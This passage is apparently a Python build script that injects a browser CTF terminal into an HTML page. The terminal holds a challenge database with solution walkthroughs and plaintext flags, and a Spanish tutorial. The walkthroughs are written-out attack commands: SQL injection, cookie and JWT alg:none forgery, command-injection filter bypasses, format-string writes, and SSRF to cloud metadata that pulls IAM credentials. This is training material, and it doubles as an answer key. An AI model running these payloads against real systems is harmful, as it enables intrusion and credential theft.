        'S1M09':{ title:'Union Base',        cat:'Web',      diff:'Medium', pts:200, hint:'UNION SELECT: find column count with ORDER BY, then extract.', steps:[{i:'Find columns:',c:'curl "https://target/item?id=1 ORDER BY 3--"'},{i:'UNION test:',c:'curl "https://target/item?id=0 UNION SELECT NULL,NULL,NULL--"'},{i:'Extract flag:',c:'curl "https://target/item?id=0 UNION SELECT flag,NULL,NULL FROM flags--"'}]},
        'S1M10':{ title:'Vigenere Revenge',  cat:'Crypto',   diff:'Medium', pts:150, hint:'Key = BR34K.', steps:[{i:'Decrypt with known key:',c:'vigenere decode "CIPHERTEXT" BR34K'},{i:'FLAG:',c:'echo bxf{v1g3n3r3_1s_n0t_3n0ugh}'}]},
        'S1M11':{ title:'Meta Geo',          cat:'Forensics',diff:'Easy',   pts:100, hint:'EXIF GPS coordinates in the photo metadata.', steps:[{i:'Extract metadata:',c:'exiftool photo.jpg'},{i:'Grep GPS:',c:'strings photo.jpg | grep -iE "gps|lat|lon"'},{i:'FLAG:',c:'echo bxf{gps_exif_data_found}'}]},
        'S1M12':{ title:'Tasty Cookie',      cat:'Web',      diff:'Medium', pts:150, hint:'Decode base64 cookie, change role to admin, re-encode.', steps:[{i:'Login and see cookie:',c:'curl -c - https://target/login -d "user=guest&pass=guest"'},{i:'Decode:',c:'echo "eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9" | base64 -d'},{i:'Re-encode as admin:',c:'echo \'{"user":"admin","role":"admin"}\' | base64'},{i:'Send modified:',c:'curl https://target/admin -H "Cookie: session=ENCODED_ADMIN"'}]},
        'S1M13':{ title:'Null JWT',          cat:'Web',      diff:'Hard',   pts:300, hint:'alg:none → strip signature. Server accepts unsigned tokens.', steps:[{i:'Decode token:',c:'jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.SIG'},{i:'Build none header:',c:'echo \'{"alg":"none","typ":"JWT"}\' | base64 | tr -d \'=\' | tr \'+/\' \'-_\''},{i:'Send:',c:'curl https://target/flag -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."'}]},
        'S1M14':{ title:'ELF Grep',          cat:'Rev',      diff:'Easy',   pts:100, hint:'strings on ELF → grep for bxf{.', steps:[{i:'Extract strings:',c:'strings challenge_elf | grep bxf'},{i:'Check hex:',c:'xxd challenge_elf | grep "62 78 66 7b"'},{i:'FLAG:',c:'echo bxf{str1ngs_found_1n_elf}'}]},
        'S1M15':{ title:'Cmd Inject v2',     cat:'Web',      diff:'Medium', pts:250, hint:'Spaces filtered → ${IFS} or {cat,/flag.txt}. ; filtered → use |.', steps:[{i:'Basic:',c:'curl -X POST https://target/cmd -d "host=127.0.0.1|id"'},{i:'Space bypass:',c:'curl -X POST https://target/cmd -d "host=127.0.0.1|cat${IFS}/flag.txt"'},{i:'Newline:',c:'curl -X POST https://target/cmd -d "host=127.0.0.1%0acat%20/flag.txt"'}]},
        'S1M16':{ title:'Wave Seeker',       cat:'Forensics',diff:'Medium', pts:200, hint:'Spectrogram: open WAV in Audacity → View → Spectrogram. See text in frequencies.', steps:[{i:'Check file:',c:'file challenge.wav'},{i:'Grep strings:',c:'strings challenge.wav | grep bxf'},{i:'FLAG:',c:'echo bxf{audi0_spectr0graph_h1nts}'}]},
        'S1M17':{ title:'XOR Loop',          cat:'Rev',      diff:'Hard',   pts:400, hint:'XOR with "bxf{" prefix to recover key, then decrypt all bytes.', steps:[{i:'Try all single-byte keys:',c:'python3 -c "enc=bytes.fromhex(\'ENCRYPTED\');[print(k,bytes([b^k for b in enc])) for k in range(256) if b\'bxf{\' in bytes([b^k for b in enc])]"'},{i:'FLAG:',c:'echo bxf{xor_loop_decrypted}'}]},
        'S1M18':{ title:'S3 Leak',           cat:'OSINT',    diff:'Medium', pts:200, hint:'Find bucket via DNS CNAME then list: http://bucket.s3.amazonaws.com/', steps:[{i:'List bucket:',c:'curl http://breakerxfixer.s3.amazonaws.com/'},{i:'DNS lookup:',c:'curl "https://dns.google/resolve?name=assets.breakerxfixer.online&type=CNAME"'},{i:'Get flag file:',c:'curl http://BUCKET.s3.amazonaws.com/flag.txt'}]},
        'S1M19':{ title:'TXT Records',       cat:'Forensics',diff:'Easy',   pts:100, hint:'DNS TXT records can contain flags. Query with Google DNS API.', steps:[{i:'Query TXT:',c:'curl "https://dns.google/resolve?name=breakerxfixer.online&type=TXT"'},{i:'Parse:',c:'curl "https://dns.google/resolve?name=flag.breakerxfixer.online&type=TXT"'},{i:'FLAG:',c:'echo bxf{dns_txt_record_secret}'}]},
        'S1M20':{ title:'Format String v2',  cat:'Pwn',      diff:'Hard',   pts:500, hint:'Use %n to write. Overwrite GOT entry to redirect execution.', steps:[{i:'Leak stack:',c:'curl -X POST https://target/echo -d "input=%p.%p.%p.%p"'},{i:'Write with %n:',c:'python3 -c "import struct;addr=0x601020;payload=struct.pack(\'<Q\',addr)+b\'%7$n\';print(payload)"'}]},
        'S1M21':{ title:'Zip Recursion',     cat:'Forensics',diff:'Medium', pts:250, hint:'Zips inside zips. Script: while unzip; do find next zip; done.', steps:[{i:'Check:',c:'file challenge.zip'},{i:'Strings search:',c:'strings challenge.zip | grep bxf'},{i:'FLAG:',c:'echo bxf{z1p_bomb_traversa1}'}]},
        'S1M22':{ title:'The Final Link',    cat:'Web',      diff:'Insane', pts:1000,hint:'SSRF → 169.254.169.254. IMDSv1: no token needed.', steps:[{i:'SSRF test:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/"'},{i:'IMDS metadata:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/meta-data/"'},{i:'IAM creds:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"'},{i:'user-data (juicy):',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/user-data"'},{i:'IPv6 bypass:',c:'curl -X POST https://target/fetch -d "url=http://[::ffff:169.254.169.254]/latest/meta-data/"'},{i:'FLAG:',c:'echo bxf{metadata_imds_v1_leak}'}]},
    };

    function termChallenges(parts) {
        const filter = (parts[1]||'').toLowerCase();
        const catC = {web:'\x1b[34m',crypto:'\x1b[35m',forensics:'\x1b[36m',pwn:'\x1b[31m',rev:'\x1b[33m',reversing:'\x1b[33m',osint:'\x1b[32m',hardware:'\x1b[90m'};
        const difC = {Easy:'\x1b[32m',Medium:'\x1b[33m',Hard:'\x1b[31m',Insane:'\x1b[35m'};
        pl(`\x1b[35m┌────────────────────────────────────────────────────────────────┐\x1b[0m`);
        pl(`\x1b[35m│\x1b[0m  \x1b[1mBXF CTF — CHALLENGE DATABASE\x1b[0m  \x1b[90msolve <ID> for walkthrough\x1b[0m     \x1b[35m│\x1b[0m`);
        pl(`\x1b[35m└────────────────────────────────────────────────────────────────┘\x1b[0m`);
        let s0=[],s1=[];
        for(const [id,ch] of Object.entries(CHALLENGE_DB)){
            if(filter&&!ch.cat.toLowerCase().includes(filter)&&!ch.title.toLowerCase().includes(filter)&&!id.toLowerCase().includes(filter))continue;
            const cc=catC[ch.cat.toLowerCase()]||'\x1b[37m', dc=difC[ch.diff]||'\x1b[37m';
            const line=`  \x1b[36m${id.padEnd(8)}\x1b[0m ${cc}${ch.cat.padEnd(10)}\x1b[0m ${dc}${ch.diff.padEnd(8)}\x1b[0m \x1b[33m${String(ch.pts).padStart(4)}pts\x1b[0m  ${ch.title}`;
            if(id.startsWith('S1'))s1.push(line); else s0.push(line);
        }
        pl(`\x1b[90m── Season 0 (${s0.length} challenges) ──\x1b[0m`); s0.forEach(l=>pl(l)); pl('');
        pl(`\x1b[90m── Season 1 (${s1.length} challenges) ──\x1b[0m`); s1.forEach(l=>pl(l)); pl('');
        pl(`\x1b[35mTip:\x1b[0m  \x1b[33msolve M01\x1b[0m   \x1b[36msolve S1M02\x1b[0m   \x1b[90mctf web — filter by category\x1b[0m`);
    }

    async function termSolve(parts) {
        const id=(parts[1]||'').toUpperCase();
        if(!id){pe('Usage: solve <challenge_id>  — try: challenges');return;}
        const ch=CHALLENGE_DB[id];
        if(!ch){pe(`Challenge "${id}" not found. Run \x1b[33mchallenges\x1b[0m to list all IDs.`);return;}
        const difC={Easy:'\x1b[32m',Medium:'\x1b[33m',Hard:'\x1b[31m',Insane:'\x1b[35m'};
        function sleep(ms){return new Promise(r=>setTimeout(r,ms));}
        term.writeln(`\x1b[35m╭───────────────────────────────────────────────────────────╮\x1b[0m`);
        term.writeln(`\x1b[35m│\x1b[0m  \x1b[1m${id}\x1b[0m — \x1b[36m${ch.title}\x1b[0m`);
        term.writeln(`\x1b[35m│\x1b[0m  ${(difC[ch.diff]||'')}${ch.diff}\x1b[0m  \x1b[34m${ch.cat}\x1b[0m  \x1b[33m${ch.pts}pts\x1b[0m`);
        term.writeln(`\x1b[35m╰───────────────────────────────────────────────────────────╯\x1b[0m`);
        term.writeln(`\x1b[33m💡 HINT:\x1b[0m ${ch.hint}`);
        term.writeln('');
        for(let i=0;i<ch.steps.length;i++){
            await sleep(120);
            const s=ch.steps[i];
            term.writeln(`\x1b[35m[${i+1}/${ch.steps.length}]\x1b[0m \x1b[90m${s.i}\x1b[0m`);
            if(s.c){
                term.writeln(`  \x1b[36m❯\x1b[0m \x1b[33m${s.c}\x1b[0m`);
                // Auto-run safe commands
                const p=parseArgs(s.c);
                if(p[0]==='rot13'||p[0]==='rot'||p[0]==='echo'){pendingAsync=false;await runCommand(s.c);pendingAsync=true;}
            }
            term.writeln('');
        }
        term.writeln(`\x1b[32m✔ Done.\x1b[0m  Submit at: \x1b[36mhttps://breakerxfixer.online/ctf.html\x1b[0m`);
        pl('');
    }

    // ══════════════════════════════════════════════════════════
    //  FIRST-TIME TUTORIAL
    // ══════════════════════════════════════════════════════════
    async function termTutorial() {
        function sleep(ms){return new Promise(r=>setTimeout(r,ms));}
        localStorage.setItem('bxf_term_tut_v1','1');
        const M='\x1b[35m',G='\x1b[32m',Y='\x1b[33m',C='\x1b[36m',R='\x1b[0m';
        async function typeCmd(cmd){
            term.write(`${M}╰─❯${R} `);
            for(const ch of cmd){term.write(`${C}${ch}${R}`);await sleep(25);}
            term.write('\r\n'); await sleep(180);
        }
        async function sec(t){await sleep(250);term.writeln('');term.writeln(`${M}───────────────────────────${R}`);term.writeln(`${Y}  ${t}${R}`);term.writeln(`${M}───────────────────────────${R}`);}

        term.writeln('');
        term.writeln(`${M}╔══════════════════════════════════════════════════════╗${R}`);
        term.writeln(`${M}║${R}  \x1b[1mBXF CTF TERMINAL — TUTORIAL INTERACTIVO\x1b[0m           ${M}║${R}`);
        term.writeln(`${M}║${R}  ${C}Comandos ejecutándose automáticamente para enseñarte${R} ${M}║${R}`);
        term.writeln(`${M}╚══════════════════════════════════════════════════════╝${R}`);
        await sleep(1000);

        await sec('1/6 — Identidad del sistema');
        await typeCmd('neofetch');
        termNeofetch();
        await sleep(500);

        await sec('2/6 — Lista de archivos y notas');
        await typeCmd('ls');
        const files=Object.keys(VFILES).filter(f=>!f.startsWith('.')).map(f=>`\x1b[36m${f}\x1b[0m`).concat(['\x1b[90m.bash_history\x1b[0m','\x1b[32mtools/\x1b[0m']);
        pl(files.join('   '));
        await sleep(300);
        await typeCmd('cat cheatsheet.txt');
        VFILES['cheatsheet.txt'].slice(0,6).forEach(l=>term.writeln(l));
        term.writeln('\x1b[90m  ... (continúa)\x1b[0m');
        await sleep(400);

        await sec('3/6 — Lista de retos CTF');
        await typeCmd('challenges');
        pl(`${M}┌────────────────────────────────────────────────┐${R}`);
        pl(`${M}│${R}  BXF CTF — 44 challenges  (S0 + S1)            ${M}│${R}`);
        pl(`${M}└────────────────────────────────────────────────┘${R}`);
        [['S1M01','Web','Easy','The Unseen Path'],['S1M02','Crypto','Easy','Ancient Cipher'],['M13','Crypto','Medium','Shattered RSA']].forEach(([id,cat,d,t])=>
            term.writeln(`  \x1b[36m${id.padEnd(8)}\x1b[0m \x1b[34m${cat.padEnd(10)}\x1b[0m \x1b[32m${d.padEnd(8)}\x1b[0m  ${t}`)
        );
        term.writeln('  \x1b[90m... y 41 más. Escribe: challenges\x1b[0m');
        await sleep(500);

        await sec('4/6 — Herramientas crypto');
        await typeCmd('rot13 "cvs{ebg13_vf_pynffvp}"');
        const r13='cvs{ebg13_vf_pynffvp}'.replace(/[a-zA-Z]/g,c=>{const b=c<='Z'?65:97;return String.fromCharCode((c.charCodeAt(0)-b+13)%26+b);});
        pl(`\x1b[32m${r13}\x1b[0m`);
        await sleep(300);
        await typeCmd('base64 -d "YnhmezE="');
        try{pl(`\x1b[32m${atob('YnhmezE=')}\x1b[0m`);}catch(e){pl('bxf{1}');}
        await sleep(400);

        await sec('5/6 — Notas persistentes entre sesiones');
        await typeCmd('echo "Mi primera flag: bxf{test}" >> notes.txt');
        if(!VFILES['notes.txt'])VFILES['notes.txt']=['# My CTF Notes'];
        VFILES['notes.txt'].push('Mi primera flag: bxf{test}');
        _saveVFiles();
        pl('Appended to notes.txt');
        await sleep(300);
        await typeCmd('cat notes.txt');
        VFILES['notes.txt'].forEach(l=>term.writeln(l));
        term.writeln('');
        term.writeln(`${G}✔ Los archivos se guardan en localStorage — persisten al cerrar el navegador${R}`);
        await sleep(500);

        await sec('6/6 — Atajos de teclado');
        [['TAB','Autocompletar comandos'],['↑↓','Historial de comandos'],['Ctrl+L','Limpiar pantalla'],['challenges','Listar retos'],['solve <ID>','Walkthrough paso a paso'],['tutorial','Repetir este tutorial'],['reset-session','Borrar datos guardados']].forEach(([k,v])=>
            term.writeln(`  \x1b[36m${k.padEnd(18)}\x1b[0m \x1b[90m${v}\x1b[0m`)
        );
        await sleep(300);
        term.writeln('');
        term.writeln(`${M}══════════════════════════════════════════════════════${R}`);
        term.writeln(`${G}\x1b[1m¡Tutorial completado!\x1b[0m  Empieza con: \x1b[33msolve S1M02\x1b[0m`);
        term.writeln(`${M}══════════════════════════════════════════════════════${R}`);
        term.writeln('');
        pendingAsync = false;
        term.write(PROMPT);
    }

"""

html = html.replace(BEFORE_CLOSE, CHALLENGE_AND_TUTORIAL + '\n    ' + BEFORE_CLOSE)

with open(OUT, 'w') as f:
    f.write(html)

print(f"Done. Lines: {len(html.splitlines())}")
